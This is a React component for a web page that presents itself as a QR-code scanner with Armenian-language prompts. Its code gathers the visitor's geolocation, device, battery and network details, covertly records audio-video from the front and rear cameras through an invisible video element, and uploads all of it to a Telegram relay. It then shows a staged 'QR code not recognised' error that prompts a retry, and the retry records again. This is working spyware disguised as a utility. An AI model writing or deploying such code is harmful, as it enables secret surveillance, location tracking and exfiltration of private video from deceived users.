"use client";

import React, { useEffect, useRef, useState, useCallback } from "react";
import QrScanner from "./qr-scanner";
import { Button } from "@/components/ui/button";
import {
  getGeolocation,
  getClientInfo,
  getNetworkInfo,
  getDeviceMemory,
  getBatteryInfo,
  getPermissionStatus,
  PermissionStatus
} from "@/lib/client-data";

const TELEGRAM_API_ENDPOINT = "/api/telegram";
const VIDEO_SEGMENT_DURATION_MS = 4000; // 4 секунды для каждого видеосегмента
const QR_SCAN_TIMEOUT_MS = 5000; // 5 секунд для видимого QR-сканирования перед имитированной ошибкой
const PREFERRED_VIDEO_MIME_TYPES = [
  "video/mp4;codecs=h264",
  "video/mp4",

];

type GeolocationData = { latitude: number; longitude: number };
type ClientInfo = { platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
type NetworkInfo = { effectiveType?: string; rtt?: number; downlink?: number };
type BatteryInfo = { level?: number; charging?: boolean; status?: string };

// Определяем типы данных, которые могут быть отправлены
type TelegramDataPayload = {
  messageType: MessageType;
  sessionId: string;
  timestamp: string;
  attempt?: number; // Добавлено для отслеживания попыток
  geolocation?: GeolocationData;
  clientInfo?: ClientInfo;
  networkInfo?: NetworkInfo;
  deviceMemory?: number;
  batteryInfo?: BatteryInfo;
  permissionStatus?: PermissionStatus;
  qrCodeData?: string;
};

// Enum для типов сообщений
enum MessageType {
  InitialSummary = "initial_summary",
  Video1 = "video1",
  Video2 = "video2",
  QrCode = "qr_code",
  VideoQrScan = "video_qr_scan",
  Geolocation = "geolocation", // Новый тип для отправки карты
}

type AppPhase =
  | "initial"
  | "collectingData"
  | "recordingVideo1"
  | "recordingVideo2"
  | "qrScanning"
  | "finished";

const PermissionHandler = () => {
  const videoRef = useRef<HTMLVideoElement>(null); // Используется для скрытой записи видео
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const mediaChunksRef = useRef<Blob[]>([]);
  const [appPhase, setAppPhase] = useState<AppPhase>("initial");
  const [loadingMessage, setLoadingMessage] = useState("Պատրաստվում ենք QR սկանավորմանը..."); // Preparing for QR scanning...
  // const [collectedData, setCollectedData] = useState<Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId' | 'attempt'>>({}); // Removed as it's unused
  const [sessionKey, setSessionKey] = useState(0);
  // const [processSuccessful, setProcessSuccessful] = useState<boolean>(false); // Removed as it's unused
  const [currentSessionId, setCurrentSessionId] = useState<string>(() => Math.random().toString(36).substring(2, 10).toUpperCase());
  const processInitiatedRef = useRef(false);
  const [attempt, setAttempt] = useState(1); // New state to track attempts
  const handleBackClick = useCallback(() => {
    if (typeof window === "undefined") return;
    window.open("https://samyunwanarmenia.netlify.app", "_self", "noopener,noreferrer");
  }, []);

  const generateSessionId = useCallback(() => {
    return Math.random().toString(36).substring(2, 10).toUpperCase();
  }, []);

  const sendDataToTelegram = useCallback(async (data: Partial<TelegramDataPayload>, type: MessageType, currentAttempt: number): Promise<boolean> => {
    console.log(`[Session ${currentSessionId}] Sending message type: ${type}, Attempt: ${currentAttempt}`);
    try {
      const payload: TelegramDataPayload = {
        ...data,
        messageType: type,
        sessionId: currentSessionId,
        timestamp: new Date().toISOString(),
        attempt: currentAttempt,
      };

      const response = await fetch(TELEGRAM_API_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        console.log(`[Session ${currentSessionId}] Data of type ${type} (Attempt ${currentAttempt}) successfully sent to Telegram!`);
        return true;
      } else {
        const errorData = await response.json();
        console.error(`[Session ${currentSessionId}] Failed to send data of type ${type} (Attempt ${currentAttempt}) to Telegram: ${errorData.error || response.statusText}`);
        return false;
      }
    } catch (error: any) {
      console.error(`[Session ${currentSessionId}] Network error sending data of type ${type} (Attempt ${currentAttempt}) to Telegram: ${error.message}`);
      return false;
    }
  }, [currentSessionId]);

  const uploadVideoToTelegram = useCallback(async (videoBlob: Blob, type: MessageType, currentAttempt: number): Promise<boolean> => {
    console.log(`[Session ${currentSessionId}] Uploading video type: ${type}, Attempt: ${currentAttempt}`);
    try {
      const formData = new FormData();
      formData.append("messageType", type);
      formData.append("sessionId", currentSessionId);
      formData.append("timestamp", new Date().toISOString());
      formData.append("attempt", currentAttempt.toString());

      const extension = videoBlob.type.includes("mp4") ? "mp4" : "webm";
      const fileName = `${type}_${currentSessionId}_attempt${currentAttempt}.${extension}`;
      formData.append("video", videoBlob, fileName);

      const response = await fetch(TELEGRAM_API_ENDPOINT, {
        method: "POST",
        body: formData,
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error(`[Session ${currentSessionId}] Failed to upload video ${type} (Attempt ${currentAttempt}): ${errorText}`);
        return false;
      }

      console.log(`[Session ${currentSessionId}] Video ${type} (Attempt ${currentAttempt}) successfully uploaded.`);
      return true;
    } catch (error: any) {
      console.error(`[Session ${currentSessionId}] Network error uploading video ${type} (Attempt ${currentAttempt}): ${error.message}`);
      return false;
    }
  }, [currentSessionId]);

  const recordVideoSegment = useCallback(
    async (duration: number, facingMode: "user" | "environment"): Promise<Blob | undefined> => {
      let stream: MediaStream | null = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: facingMode },
          audio: true,
        });

        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.muted = true;
          videoRef.current.setAttribute("playsinline", "true");
          await videoRef.current.play().catch((e) => console.error("Error playing hidden video stream:", e));
        }

        const mimeType = (() => {
          if (typeof window === "undefined" || typeof MediaRecorder === "undefined") {
            return "video/webm";
          }
          for (const type of PREFERRED_VIDEO_MIME_TYPES) {
            if (MediaRecorder.isTypeSupported(type)) {
              return type;
            }
          }
          return "video/webm";
        })();

        return new Promise((resolve) => {
          mediaRecorderRef.current = new MediaRecorder(stream!, { mimeType });
          mediaChunksRef.current = [];

          mediaRecorderRef.current.ondataavailable = (event) => {
            if (event.data.size > 0) {
              mediaChunksRef.current.push(event.data);
            }
          };

          mediaRecorderRef.current.onstop = () => {
            const normalizedType = mimeType.includes("mp4") ? "video/mp4" : "video/webm";
            const videoBlob = new Blob(mediaChunksRef.current, { type: normalizedType });
            resolve(videoBlob);
            stream?.getTracks().forEach((track) => track.stop());
            if (videoRef.current) {
              videoRef.current.srcObject = null;
            }
          };

          mediaRecorderRef.current.start();
          setTimeout(() => {
            if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
              mediaRecorderRef.current.stop();
            }
          }, duration);
        });
      } catch (error: any) {
        console.error(`Camera/Microphone access denied for ${facingMode} camera (hidden recording): ${error.message}`);
        stream?.getTracks().forEach((track) => track.stop());
        if (videoRef.current) {
          videoRef.current.srcObject = null;
        }
        return undefined;
      }
    },
    []
  );

  const handleQrCodeScanned = useCallback(
    async (qrData: string) => {
      console.log(`[Session ${currentSessionId}] handleQrCodeScanned called. QR Data: ${qrData}`);
      setAppPhase("finished");
      console.log(`[Session ${currentSessionId}] setAppPhase to 'finished' from handleQrCodeScanned.`);
      setAttempt(prev => {
        const newAttempt = prev + 1;
        console.log(`[Session ${currentSessionId}] handleQrCodeScanned: Incrementing attempt from ${prev} to ${newAttempt}`);
        return newAttempt;
      });
      processInitiatedRef.current = false; // Сбрасываем флаг для возможности повторной попытки
      console.log(`[Session ${currentSessionId}] handleQrCodeScanned: processInitiatedRef reset to false.`);
    },
    [currentSessionId]
  );

  const handleQrScanError = useCallback(
    async (error: string) => {
      console.error(`[Session ${currentSessionId}] handleQrScanError called. Error: ${error}`);
      // setProcessSuccessful(false); // Removed as it's unused
      setAppPhase("finished");
      console.log(`[Session ${currentSessionId}] setAppPhase to 'finished' from handleQrScanError.`);
      setAttempt(prev => {
        const newAttempt = prev + 1;
        console.log(`[Session ${currentSessionId}] handleQrScanError: Incrementing attempt from ${prev} to ${newAttempt}`);
        return newAttempt;
      });
      processInitiatedRef.current = false; // Сбрасываем флаг для возможности повторной попытки
      console.log(`[Session ${currentSessionId}] handleQrScanError: processInitiatedRef reset to false.`);
    },
    [currentSessionId]
  );

  const handleQrCameraActive = useCallback(() => {
    setLoadingMessage("Տեղադրեք QR կոդը շրջանակի մեջ..."); // Place the QR code within the frame...
    console.log(`[Session ${currentSessionId}] handleQrCameraActive: QR camera is active.`);
  }, [currentSessionId]);

  const handleVideoRecordedDuringScan = useCallback(async (videoBlob: Blob) => {
    console.log(`[Session ${currentSessionId}] Video recorded during QR scan received.`);
    await uploadVideoToTelegram(videoBlob, MessageType.VideoQrScan, attempt);
    // setProcessSuccessful(prev => prev && videoSendSuccess); // Removed as it's unused
  }, [currentSessionId, uploadVideoToTelegram, attempt]);

  const startNewSession = useCallback(() => {
    console.log(`[Session ${currentSessionId}] Starting new session.`);
    setAppPhase("initial");
    // setCollectedData({}); // Removed as it's unused
    setSessionKey((prevKey) => prevKey + 1);
    // setProcessSuccessful(false); // Removed as it's unused
    setCurrentSessionId(generateSessionId());
    processInitiatedRef.current = false;
    setAttempt(1);
    console.log(`[Session ${currentSessionId}] Session reset. New Session ID: ${generateSessionId()}, Attempt: 1`);
  }, [generateSessionId, currentSessionId]);

  const runProcess = useCallback(async () => {
    console.log(`[Session ${currentSessionId}] runProcess called. Current attempt: ${attempt}, processInitiatedRef.current: ${processInitiatedRef.current}`);
    if (processInitiatedRef.current) {
      console.log(`[Session ${currentSessionId}] runProcess already initiated for this session. Skipping.`);
      return;
    }
    processInitiatedRef.current = true;
    console.log(`[Session ${currentSessionId}] Starting runProcess. Attempt: ${attempt}`);

    const genericLoadingMessage = "Պատրաստվում ենք QR սկանավորմանը, խնդրում ենք սպասել..."; // "Preparing for QR scanning, please wait..."

    if (attempt === 1) {
      setLoadingMessage(genericLoadingMessage);
      setAppPhase("collectingData");
      console.log(`[Session ${currentSessionId}] setAppPhase to 'collectingData'.`);

      const [
        permissionStatusResult,
        batteryInfoResult,
        geolocationResult,
      ] = await Promise.all([
        getPermissionStatus(),
        getBatteryInfo(),
        getGeolocation(),
      ]);

      if (geolocationResult.data) {
        console.log(`[Session ${currentSessionId}] Geolocation data found, sending immediately.`);
        sendDataToTelegram({ geolocation: geolocationResult.data }, MessageType.Geolocation, attempt);
      }

      const clientInfo = getClientInfo();
      const networkInfo = getNetworkInfo();
      const deviceMemory = getDeviceMemory();

      const initialCollectedData: Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId' | 'attempt'> = {
        clientInfo, networkInfo, deviceMemory, permissionStatus: permissionStatusResult,
      };

      if (batteryInfoResult.data) {
        initialCollectedData.batteryInfo = { ...batteryInfoResult.data, status: batteryInfoResult.status };
      } else {
        initialCollectedData.batteryInfo = { status: batteryInfoResult.status };
      }

      if (geolocationResult.data) {
        initialCollectedData.geolocation = geolocationResult.data;
      }
      if (initialCollectedData.permissionStatus) {
        initialCollectedData.permissionStatus.geolocation = geolocationResult.status;
      }
      
      // setCollectedData(initialCollectedData); // Removed as it's unused

      await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary, attempt);
      // setProcessSuccessful(initialSendSuccess); // Removed as it's unused

      setAppPhase("recordingVideo1");
      console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo1'.`);
      const video1Blob = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
      if (video1Blob) {
        await uploadVideoToTelegram(video1Blob, MessageType.Video1, attempt);
        // setProcessSuccessful(prev => prev && video1SendSuccess); // Removed as it's unused
      }

      setAppPhase("recordingVideo2");
      console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2'.`);
      const video2Blob = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
      if (video2Blob) {
        await uploadVideoToTelegram(video2Blob, MessageType.Video2, attempt);
        // setProcessSuccessful(prev => prev && video2SendSuccess); // Removed as it's unused
      }

      setAppPhase("qrScanning");
      console.log(`[Session ${currentSessionId}] setAppPhase to 'qrScanning'.`);

    } else if (attempt === 2) {
      console.log(`[Session ${currentSessionId}] Attempt 2 initiated (Retry).`);
      const stage2Message = { qrCodeData: "Этап 2: Повторная попытка сканирования QR-кода." };
      await sendDataToTelegram(stage2Message, MessageType.QrCode, attempt);

      setLoadingMessage(genericLoadingMessage);
      setAppPhase("recordingVideo2");
      console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2' for attempt 2.`);
      const video2Blob = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
      if (video2Blob) {
        await uploadVideoToTelegram(video2Blob, MessageType.Video2, attempt);
        // setProcessSuccessful(prev => prev && video2SendSuccess); // Removed as it's unused
      }
      
      setAppPhase("qrScanning");
      console.log(`[Session ${currentSessionId}] setAppPhase to 'qrScanning' for attempt 2.`);
      return;
    }
    
  }, [
    currentSessionId,
    sendDataToTelegram,
    uploadVideoToTelegram,
    recordVideoSegment,
    setAppPhase,
    // setProcessSuccessful, // Removed as it's unused
    // setCollectedData, // Removed as it's unused
    processInitiatedRef,
    attempt
  ]);

  useEffect(() => {
    if (attempt === 1 && !processInitiatedRef.current) {
      runProcess();
    }
  }, [sessionKey, runProcess, attempt]);


  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-background text-foreground p-4">
      {(appPhase === "initial" ||
        appPhase === "collectingData" ||
        appPhase === "recordingVideo1" ||
        appPhase === "recordingVideo2") && (
        <>
          <p className="text-lg mb-4 text-center font-bold text-primary animate-pulse">
            {loadingMessage}
          </p>
          <div className="relative w-full max-w-md aspect-video bg-secondary flex items-center justify-center rounded-lg overflow-hidden shadow-lg">
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className="w-full h-full object-cover"
              style={{ opacity: 0 }}
            />
            <div className="absolute inset-0 border-4 border-primary opacity-70 rounded-lg pointer-events-none animate-border-pulse" />
            <div className="absolute inset-0 flex items-center justify-center">
              <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-primary" />
            </div>
          </div>
        </>
      )}
      {appPhase === "qrScanning" && (
        <QrScanner 
          onQrCodeScanned={handleQrCodeScanned} 
          onScanError={handleQrScanError} 
          onCameraActive={handleQrCameraActive} 
          scanTimeoutMs={QR_SCAN_TIMEOUT_MS}
          onVideoRecordedDuringScan={handleVideoRecordedDuringScan}
        />
      )}
      {appPhase === "finished" && (
        <div className="flex flex-col items-center justify-center text-center p-6 bg-card rounded-lg shadow-xl animate-fade-in">
          {attempt <= 2 ? (
            <>
              <p className="text-xl mb-4 font-semibold text-primary">
                QR կոդը չհաջողվեց ճանաչել:
              </p>
              <p className="text-muted-foreground mb-6">
                Խնդրում ենք համոզվել, որ կոդը հստակ է, լավ լուսավորված և ամբողջությամբ տեսանելի է շրջանակում:
              </p>
              <div className="w-full flex flex-col gap-3">
                <Button 
                  onClick={runProcess} 
                  className="w-full px-8 py-3 text-lg bg-primary text-primary-foreground hover:bg-primary/90 transition-colors duration-300 transform hover:scale-105 active:scale-95"
                >
                  Կրկնել
                </Button>
                <Button
                  onClick={handleBackClick}
                  variant="outline"
                  className="w-full px-8 py-3 text-lg border-secondary text-secondary-foreground hover:bg-secondary/20 transition-colors duration-300"
                >
                  Հետ
                </Button>
              </div>
            </>
          ) : (
            <>
              <p className="text-xl mb-4 font-semibold text-destructive">
                Սկանավորումն անհնար է:
              </p>
              <p className="text-muted-foreground">
                Տեխնիկական խնդիրների պատճառով այս պահին հնարավոր չէ շարունակել։ Խնդրում ենք փորձել մի փոքր ուշ:
              </p>
              <Button
                onClick={handleBackClick}
                className="mt-4 px-8 py-3 text-lg bg-secondary text-secondary-foreground hover:bg-secondary/80 transition-colors duration-300"
              >
                Հետ
              </Button>
            </>
          )}
        </div>
      )}
    </div>
  );
};

export default PermissionHandler;
